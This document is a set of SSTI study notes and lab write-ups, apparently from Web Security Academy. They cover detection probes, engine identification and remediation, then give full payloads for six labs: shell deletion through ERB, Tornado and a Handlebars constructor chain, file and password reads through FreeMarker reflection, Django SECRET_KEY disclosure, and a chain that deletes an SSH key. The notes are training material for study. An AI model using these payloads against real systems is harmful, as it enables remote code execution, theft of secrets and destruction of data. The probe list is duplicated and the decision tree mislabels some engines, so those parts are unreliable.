## 1. Vulnerability Core

- **Vulnerability Type:** Server-Side Template Injection (SSTI)
    
- **Core Meaning:** SSTI occurs when an application directly concatenates malicious user-supplied input into a template string prior to rendering, rather than passing it safely as background data.
    
- **The Downstream Pivot:** Because template engines are designed to execute complex logic, injecting native template directives allows attackers to break out of the presentation layer, access internal framework objects, read arbitrary backend files, and frequently execute administrative shell commands to achieve full Remote Code Execution (RCE).

## 2. Detection & Attack Surface Mapping (In the Wild)

Finding template injection surfaces requires tracking down parameters or form fields that dynamically alter webpage structures or user-customized communications.

### Identifying High-Risk Code Features

- **Custom Dynamic Profiles:** Areas allowing users to craft custom email bodies, markdown notifications, blog layouts, or product descriptions using shortcodes or parameters.
    
- **Reflected Messaging:** Content-management nodes, notification banners, or error systems that pass status text directly through a parameter (e.g., `?message=`, `?error=`).


### Active Probing Strategy

To discover SSTI in production environments, use the **Detect ➔ Identify** methodology:

#### Step 1: Detect via Fuzz Strings

Submit a sequence of structural template control characters to see if the server returns framework execution errors or structural layout shifts:

Polyglot probe

```
${{<%[%'"}}%\
```

#### Step 2: Test Context-Specific Logic

- **Plaintext Context:** If your input lands directly on the HTML page, attempt a mathematical operation to see if the engine evaluates it on the server side:
    
    - Input: `?username=${7*7}` or `{{7*7}}`
        
    - Vulnerable Output: `Hello 49`
        
- **Code Context:** If your input lands inside an existing template parameter expression (e.g., `engine.render("Hello {{user.name}}")`), verify by breaking out of the logic block wrapper explicitly:
    
    - Input: `?greeting=user.name}}<tag>`
        
    - Vulnerable Output: `Hello Carlos<tag>` (The explicit HTML tag is rendered cleanly next to the resolved object data).

#### Step 3: Identify via Decision Tree

Different engines resolve mathematical strings uniquely. Use the standard behavioral mapping chart to narrow down the target technology:

```
                  ${7*7}
                 /      \
             Responds   Doesn't Respond
               49            {{7*7}}
             /    \          /     \
      a-z or _    {{7*7}}   49    Not 49
       Smarty     /     \  Jinja2    |
                 49   Not 49  /     {{7*'7'}}
                Mako    |  Twig    /         \
                      Freemarker  7777777     49
                                  Jinja2     Twig
```

## 3. Classifications (The Scenarios)

- **Unsandboxed Native Code Execution:** Default template installations (like Ruby's ERB or Python's Mako) that feature native programming structures within the presentation block, allowing immediate access to system execution commands.

- **Inline Variable Context Injection:** Input that lands directly inside a template statement string, requiring attackers to append closing brackets (like `}}`) to drop down into secondary command blocks.
    
- **Documented Engine Exploitation (Sandbox/Complex Engines):** Heavily restricted template frameworks (like Handlebars or Velocity) that require chaining internal constructors or utilizing specific publicly documented prototype chains to break containment blocks.
    
- **Data Exfiltration via Environment Contexts:** Secure or sandboxed execution zones where shell execution is entirely blocked, but critical environment tables (like Django's `settings` structure) remain exposed via global debugging wrappers.
    

## 4. Remediation

- **Logic-less Engine Implementations:** Build public custom UI layers using strictly structured, logic-less template processors such as Mustache.
    
- **Strict Parameter Data Passing:** Always separate presentation layouts from volatile information. Ensure data fields pass explicitly as a dictionary payload parameter argument map, never via direct string concatenation:

- PHP
    
    ```
    // SAFE: Volatile input handled strictly as data
    $output = $twig->render("Dear {first_name},", array("first_name" => $_GET['name']));
    ```
    

## 5. Lab Breakthroughs & Payloads

### Lab 1: Basic server-side template injection

- **Attack Vector:** Naked URL-parameter concatenation directly into a live Ruby ERB template execution block.
    

 ### 🛑 SOLUTION & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):**
 
 1. [ ] Identify the injection path via the `?message=` parameter on the product out-of-stock notification string.
     
 2. [ ] Submit a proof-of-concept mathematical payload to confirm ERB execution: `<%= 7*7 %>` (URL-encoded: `<%25%3d+7*7+%25>`). The response returns `49`.
     
 3. [ ] Use Ruby's native `system()` call inside the execution wrapper to run an OS command that drops the specified flag file:

 HTTP
 
 ```
 GET /?message=<%25+system("rm+/home/carlos/morale.txt")+%25> HTTP/1.1
 Host: YOUR-LAB-ID.web-security-academy.net
 Connection: close
 ```

### Lab 2: Basic server-side template injection (code context)

- **Attack Vector:** Injection lands inside an existing Tornado evaluation block statement, requiring a bracket breakout sequence before executing inline Python modules.


- ### SOLUTION & PAYLOAD BREAKDOWN

**Exploitation Routine (Payload):**

1. [ ] Set the profile author display parameter to a test mathematical breakout payload: `user.name}}{{7*7}}`. Inspecting the output page returns `Peter Wiener49}}`, confirming code context exploitation.
    
2. [ ] Construct a multi-stage Python statement payload. Use `}}` to seal the original statement, inject an independent code execution block (`{% ... %}`) to pull the `os` utility into the running memory pool, and execute a shell instruction:
    

HTTP

```
POST /my-account/change-blog-post-author-display HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
```

3. [ ] Refresh the blog post containing your comment to force the template processing engine to run your injected script block.

### Lab 3: Server-side template injection in an unknown language with a documented exploit

- **Attack Vector:** Fuzz errors expose Node.js Handlebars engine execution, requiring a complex JavaScript object prototype chain bypass to trigger remote shell commands.
    

 ### 🛑 SOLUTION & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):**
 
 1. [ ] Input an invalid fuzz string into the parameter path to force a detailed stack trace error that confirms the target backend engine: `Handlebars`.
     
 2. [ ] Use a documented constructor breakout template structure to reach JavaScript's implicit function constructor scope, then execute the standard Node `child_process` execution handler:
     
 
 Handlebars
 
 ```
 wrtz{{#with "s" as |string|}}
     {{#with "e"}}
         {{#with split as |conslist|}}
             {{this.pop}}
             {{this.push (lookup string.sub "constructor")}}
             {{this.pop}}
             {{#with string.split as |codelist|}}
                 {{this.pop}}
                 {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                 {{this.pop}}
                 {{#each conslist}}
                     {{#with (string.sub.apply 0 codelist)}}
                         {{this}}
                     {{/with}}
                 {{/each}}
             {{/with}}
         {{/with}}
     {{/with}}
 {{/with}}
 ```

 3. [ ] Fully URL-encode the payload string block and supply it directly as the target value inside the application's `?message=` parameter field to run the execution chain.

### Lab 4: Server-side template injection with information disclosure via user-supplied objects

- **Attack Vector:** An SSTI environment utilizing a safe sandbox constraint that blocks shell access, but leaves structural engine debug objects open to reflection.
    

 ### 🛑 SOLUTION & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):**
 
 1. [ ] Inject a standard fuzz payload string into the editable description template. The application framework error alerts that the environment is running Python's `Django` template configuration.
     
 2. [ ] Submit the framework's native diagnostic template tag block directly into the template body context:
     
 
 Django
 
 ```
 {% debug %}
 ```

 3. [ ] Save the template block and inspect the page output. Review the variables table to identify the application scope variables available for query, noting the presence of the system `settings` mapping object context.
     
 4. [ ] Overwrite the template with a target parameter expression payload pointing explicitly to Django's application secret file pointer configuration:
 
  
  Django

```
{{settings.SECRET_KEY}}
```

5. [ ] Save the template page to read the clear text key configuration string.


### Lab 5: Server-side template injection in a sandboxed environment

- **Attack Vector:** Sandbox breakout via object reflection chain in FreeMarker. When typical execution wrappers (like `freemarker.template.utility.Execute`) are restricted, an attacker can use the base Java `Object.getClass()` method to traverse low-level class loaders, dynamically instantiate native stream utilities, and read local files.
    

 ### 🛑 SOLUTION & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):**
 
 1. Target the product description layout editor. Inject a test native reflection payload against an exposed baseline template data entity (`product`):
     
     Code snippet
     
     ```
     ${product.getClass()}
     ```
     
 1. Abuse Java's structural inheritance model to traverse through protection domains, grab the local underlying URL system resolver framework, and initiate an asynchronous raw stream read directly from the host file system target:
     
     Code snippet
     
     ```
     ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
     ```
     
 2. Save the template. The server bypasses the application sandbox and returns the target document bytes as a raw, space-delimited string of decimal ASCII values.
     
 3. Convert the decimal integers back into clear text characters to capture the administrative password token.

### Lab 6: Server-side template injection with a custom exploit

- **Attack Vector:** Chaining undocumented developer-supplied application methods (`user.setAvatar()` and `user.gdprDelete()`) to construct an arbitrary file read/delete primitive on custom application infrastructure.
    

 ### 🛑 SOLUTION & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):**
 
 1. [ ] Trigger an intentional application error by uploading an invalid file format as a profile picture. The server error reveals the file handling logic layer (`/home/carlos/User.php`) and exposes a specific setter method: `user.setAvatar()`.
     
 2. [ ] Break out of the template profile author parameter inside Burp Repeater. Force the server's internal avatar function to bind itself to an arbitrary system configuration path instead of a standard image file:
     
     HTTP
     
     ```
     blog-post-author-display=user.setAvatar('/etc/passwd','image/jpg')
     ```
     
 3. [ ] View your comment page to execute the payload, then issue a direct query to read the reflected content output: `GET /avatar?avatar=wiener`. The server returns the file contents.
     
 4. [ ] Pivot this arbitrary read capability to extract the developer's raw source file discovered during mapping step 1:
     
     HTTP
     
     ```
     blog-post-author-display=user.setAvatar('/home/carlos/User.php','image/jpg')
     ```
     
 5. [ ] Review the downloaded `User.php` source code. Identify a built-in clean-up execution helper function called `gdprDelete()`, which automatically triggers a file system deletion (`unlink`) on whatever target path is currently saved inside the active avatar variable state.
     
 6. [ ] Force a targeted file destruction exploit chain by pointing the profile avatar storage variable directly to Carlos's internal SSH authentication credential file, then immediately invoking the destructive clean-up handler method:
     
     - **Payload A (Stage File Pointer):** > `user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')` (Render comment to trigger).
         
     - **Payload B (Execute File Deletion):** > `user.gdprDelete()` (Render comment to finish execution loop).
### Advanced Tactics: Constructing Object Chains & Breaking Sandboxes in the Wild

When facing secured or heavily custom environments where standard RCE blueprints fail, your analysis workflow should pivot to object chaining and developer API hunting:

- **Map the Global Environment Map:** Always look for entry-level reflection primitives like Java's `.getClass()`, Python's `.__class__.__mro__`, or PHP's `get_class()`. These are your keys to discovering the structural landscape hidden behind the sandbox wall.
    
- **Document Chained Data Flows:** Treat every uncovered method call as a stepping stone. Check the documentation for what an object _returns_ rather than just what it _does_. If Method A returns a File Object, and Method B reads a stream from a File Object, you have a custom payload chain, even if direct system commands are blocked.
    
- **Audit Source Errors for Hidden Methods:** Developer-supplied custom code is rarely audited as heavily as core engine sandboxes. Pay close attention to verbose errors generated by handling edge-case inputs (such as bad file headers or null data arrays). These errors often leak proprietary backend class signatures and functions that lack strict access control, opening the door for tailored exploits.



**Extra Probing techniques for each template specific engine**

SSTI Safe Confirmation Payloads

Use these payloads to safely confirm Server-Side Template Injection once you have identified the underlying engine. If the output matches the "Expected Result," the vulnerability is confirmed.

**Python Engines**

**1.** **Jinja2 / Tornado**

Jinja2 uses standard double curly braces. Python evaluates string multiplication differently than PHP, making it easy to confirm.

Math Probe: {{ 7 * 7 }}

Expected Result: 49

String Repetition (Jinja-specific): {{ '7' * 7 }}

Expected Result: 7777777

Environment Probe: {{ config }} or {{ request }}

Expected Result: Returns a configuration object or memory address (e.g., <Config {'ENV': 'production'...>).

**2. Mako**

Mako uses a syntax more closely resembling inline Python evaluation.

Math Probe: ${ 7 * 7 }}

Expected Result: 49

String Probe: ${ 'mako'.capitalize() }

Expected Result: Mako

SSTI Safe Confirmation Payloads

Use these payloads to safely confirm Server-Side Template Injection once you have identified the underlying engine. If the output matches the "Expected Result," the vulnerability is confirmed.

Python Engines

**1. Jinja2 / Tornado**

Jinja2 uses standard double curly braces. Python evaluates string multiplication differently than PHP, making it easy to confirm.

Math Probe: {{ 7 * 7 }}

Expected Result: 49

String Repetition (Jinja-specific): {{ '7' * 7 }}

Expected Result: 7777777

Environment Probe: {{ config }} or {{ request }}

Expected Result: Returns a configuration object or memory address (e.g., <Config {'ENV': 'production'...>).

**2. Mako**

Mako uses a syntax more closely resembling inline Python evaluation.

Math Probe: ${ 7 * 7 }}

Expected Result: 49

String Probe: ${ 'mako'.capitalize() }

Expected Result: Mako

**PHP Engines**

**1. Twig**

Twig is strict about its syntax but performs loose type juggling on math operations.

Math Probe: {{ 7 * 7 }}

Expected Result: 49

Type Juggling (Twig-specific): {{ 7 * '7' }}

Expected Result: 49 (Twig treats the string as an integer, unlike Jinja).

Version Dump: {{ dump(app) }} (Note: Only works if debugging is enabled).

**2. Smarty**

Smarty traditionally uses single curly braces, which can sometimes conflict with JSON.

Math Probe: {7*7}

Expected Result: 49

Version Disclosure: {$smarty.version}

Expected Result: The specific Smarty version number (e.g., 3.1.39).

**Java Engines**

**1. FreeMarker**

FreeMarker uses a dollar sign followed by curly braces. It has robust built-in string manipulation methods.

Math Probe: ${7*7}

Expected Result: 49

String Manipulation: ${"freemarker".toUpperCase()}

Expected Result: FREEMARKER

Version Disclosure: ${.version}

Expected Result: The FreeMarker version number (e.g., 2.3.31).

**2. Velocity**

Velocity uses a hash and dollar sign syntax for variables and references.

Math Probe: #set($math = 7 * 7) $math

Expected Result: 49

Class Probe: $class.inspect("velocity")

Expected Result: Returns class metadata (if standard protections aren't blocking it).

Ruby Engines

**1. ERB (Embedded Ruby)**

ERB uses tags similar to classic ASP or JSP.

Math Probe: <%= 7 * 7 %>

Expected Result: 49

String Multiplication: <%= 'ruby' * 2 %>

Expected Result: rubyruby

Version Disclosure: <%= RUBY_VERSION %>

Expected Result: The underlying Ruby version (e.g., 3.0.2).

**Node.js Engines**

**1. Pug (formerly Jade)**

Pug relies heavily on indentation and uses a minimalist syntax.

Math Probe: #{7*7}

Expected Result: 49

Global Object Probe: #{root.process.version} or #{GLOBAL.process.version}

Expected Result: The Node.js version environment variable.

**2. EJS (Embedded JavaScript)**

EJS uses syntax very similar to Ruby's ERB.

Math Probe: <%= 7 * 7 %>

Expected Result: 49

**1. Twig**

Twig is strict about its syntax but performs loose type juggling on math operations.

Math Probe: {{ 7 * 7 }}

Expected Result: 49

Type Juggling (Twig-specific): {{ 7 * '7' }}

Expected Result: 49 (Twig treats the string as an integer, unlike Jinja).

Version Dump: {{ dump(app) }} (Note: Only works if debugging is enabled).

**2. Smarty**

Smarty traditionally uses single curly braces, which can sometimes conflict with JSON.

Math Probe: {7*7}

Expected Result: 49

Version Disclosure: {$smarty.version}

Expected Result: The specific Smarty version number (e.g., 3.1.39).

**Java Engines**

**1. FreeMarker**

FreeMarker uses a dollar sign followed by curly braces. It has robust built-in string manipulation methods.

Math Probe: ${7*7}

Expected Result: 49

String Manipulation: ${"freemarker".toUpperCase()}

Expected Result: FREEMARKER

Version Disclosure: ${.version}

Expected Result: The FreeMarker version number (e.g., 2.3.31).

**2. Velocity**

Velocity uses a hash and dollar sign syntax for variables and references.

Math Probe: #set($math = 7 * 7) $math

Expected Result: 49

Class Probe: $class.inspect("velocity")

Expected Result: Returns class metadata (if standard protections aren't blocking it).

**Ruby Engines**

**1. ERB (Embedded Ruby)**

ERB uses tags similar to classic ASP or JSP.

Math Probe: <%= 7 * 7 %>

Expected Result: 49

String Multiplication: <%= 'ruby' * 2 %>

Expected Result: rubyruby

Version Disclosure: <%= RUBY_VERSION %>

Expected Result: The underlying Ruby version (e.g., 3.0.2).

**Node.js Engines**

**1. Pug (formerly Jade)**

Pug relies heavily on indentation and uses a minimalist syntax.

Math Probe: #{7*7}

Expected Result: 49

Global Object Probe: #{root.process.version} or #{GLOBAL.process.version}

Expected Result: The Node.js version environment variable.

**2. EJS (Embedded JavaScript)**

EJS uses syntax very similar to Ruby's ERB.

Math Probe: <%= 7 * 7 %>

Expected Result: 49
